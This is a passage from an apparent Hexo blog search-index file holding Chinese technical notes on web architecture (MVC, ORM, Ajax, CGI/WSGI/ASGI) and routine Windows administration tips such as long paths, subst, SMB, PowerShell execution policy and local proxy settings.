<p>Model：模型，是网站访问数据库的接口。<br>View：视图，用户能够看到的页面。<br>Controller：控制器，用于操作数据库，处理用户业务，控制用户行为的程序。</p>
<p>三者的划分即是从功能的角度划分，也是从数据的处理流程的划分。一般流程为：<br><code>用户发出请求</code>-&gt;<code>控制器处理请求</code>-&gt;<code>模型获取数据</code>-&gt;<code>视图渲染界面</code>-&gt;<code>用户得到反馈</code></p>
<h2 id="ORM-框架"><a href="#ORM-框架" class="headerlink" title="ORM 框架"></a>ORM 框架</h2><p>Object：对象<br>Relatioin：关系，MySQL中的表<br>Mapping：映射</p>
<p>利用ORM框架，使对象与关系表对应，对象的属性与关系表中的字段对应，通过操作类和对象的方式来编辑修改数据库。</p>
<h2 id="事件驱动"><a href="#事件驱动" class="headerlink" title="事件驱动"></a>事件驱动</h2><h1 id="Web-技术"><a href="#Web-技术" class="headerlink" title="Web 技术"></a>Web 技术</h1><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><p><a href="https://bost.ocks.org/mike/">https://bost.ocks.org/mike/</a></p>
<h2 id="UPnP"><a href="#UPnP" class="headerlink" title="UPnP"></a>UPnP</h2><h2 id="Ajax-技术"><a href="#Ajax-技术" class="headerlink" title="Ajax 技术"></a>Ajax 技术</h2><p>Ajax 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术。通过在后台与服务器进行少量数据交换，Ajax 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。</p>
<p>这里就要建议用户使用IE6+以上的版本，因为之前的版本的Ajax技术的使用方法和主流浏览器不一样。如果非得使用旧版IE，那就要单独为旧版IE写一套代码了（使用jQuery框架可以屏蔽这种差异）。当然不止是Ajax，一些CSS也需要另外写一套。</p>
<h2 id="CGI，WSGI-与-ASGI"><a href="#CGI，WSGI-与-ASGI" class="headerlink" title="CGI，WSGI 与 ASGI"></a>CGI，WSGI 与 ASGI</h2><p>CGI：CGI脚本简单地讲是个运行在Web服务器上的程序, 由浏览器的输入触发。这个脚本通常象服务器和系统中其他程序如数据库的桥梁。CGI是一种古老的Web技术，一般有C&#x2F;C++编写，是PHP等语言出现之前就有的产物。当然，也可以用Lua，Python来编写。</p>
<p>WSGI：是一种服务器和客户端交互的接口规范，规定客户与服务器如何通信。</p>
<p>ASGI：由Django团队首创，支持WebSocket，HTTP2等服务。</p>
<h1 id="运维理念"><a href="#运维理念" class="headerlink" title="运维理念"></a>运维理念</h1><h2 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h2><h2 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h2><h2 id="CI-CD"><a href="#CI-CD" class="headerlink" title="CI CD"></a>CI CD</h2>]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>设计架构</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows</title>
    <url>/2020/02/11/%E8%BF%90%E7%BB%B4/Windows/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="Powershell-无法滚动"><a href="#Powershell-无法滚动" class="headerlink" title="Powershell 无法滚动"></a>Powershell 无法滚动</h1><p>右键，点属性，选择布局，取消勾选高度限制。</p>
<h1 id="文件磁盘"><a href="#文件磁盘" class="headerlink" title="文件磁盘"></a>文件磁盘</h1><h2 id="文件名"><a href="#文件名" class="headerlink" title="文件名"></a>文件名</h2><p>在Windows系统中有对文件名的长度限制（MAX_PATH），一般是最大为260。如果要突破这一限制，可以修改注册表： </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem </span><br><span class="line">LongPathsEnabled = 1</span><br></pre></td></tr></table></figure>

<p>另外Windows API还提供了一个方法来绕过这个MAX_PATH的限制。如果在文件路径前面加上<code>\\?\</code>的前缀，然后调用unicode版本的Windows API，那么这个文件名的最大长度就可以达到32k了。也就是说你只要加上前缀<code>\\?\</code>就可以在Windows API中使用long path了。</p>
<p>对于超长的环境变量，可以通过另建一个变量来存储多余环境变量的方法。</p>
<h2 id="文件夹映射为磁盘"><a href="#文件夹映射为磁盘" class="headerlink" title="文件夹映射为磁盘"></a>文件夹映射为磁盘</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 映射z盘为dir文件夹</span></span><br><span class="line">subst z: e:\<span class="built_in">dir</span></span><br><span class="line"><span class="comment"># 取消映射</span></span><br><span class="line">subst z: /d</span><br></pre></td></tr></table></figure>

<h1 id="Win10-共享"><a href="#Win10-共享" class="headerlink" title="Win10 共享"></a>Win10 共享</h1><p>Win10默认关闭SMB服务，导致无法访问局域网其他设备的共享。<br>可以在程序和功能种开启。</p>
<h1 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h1><h2 id="禁止运行脚本"><a href="#禁止运行脚本" class="headerlink" title="禁止运行脚本"></a>禁止运行脚本</h2><p>解决<code>cnpm</code>无法加载文件<code>C:\Users\hp\AppData\Roaming\npm\cnpm.ps1</code>，因为在此系统上禁止运行脚本。</p>
<p>解决方法:</p>
<blockquote>
<p>以管理员身份运行<code>Powershell</code><br>输入<code>set-ExecutionPolicy RemoteSigned</code><br>然后输入 <code>A</code> 回车</p>
</blockquote>
<h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$env</span>:HTTP_PROXY=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="variable">$env</span>:HTTPS_PROXY=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure>

<p>非Powershell下为</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> http_proxy=http://127.0.0.1:7890</span><br><span class="line"><span class="built_in">set</span> https_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>开发运维</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
</search>
